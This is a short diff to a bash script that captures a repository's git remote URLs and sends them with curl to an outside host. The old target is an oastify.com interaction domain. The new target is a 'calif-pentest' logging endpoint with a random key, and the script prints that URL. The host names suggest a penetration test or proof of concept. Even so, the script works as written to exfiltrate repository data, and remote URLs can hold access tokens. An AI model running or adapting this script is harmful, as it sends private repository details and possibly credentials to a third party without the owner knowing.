@@ -1,4 +1,11 @@
 #!/bin/bash
 
 git remote -v > /tmp/test.txt
-curl http://cursor.bo3g9xfz5xwyg2xey5p46a0swj2aq1eq.oastify.com --data-binary @/tmp/test.txt
+
+key=`head -c 32 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 32`
+
+url="https://log.calif-pentest.com/log?key=${key}"
+
+curl --data-binary @/tmp/test.txt $url
+
+echo $url
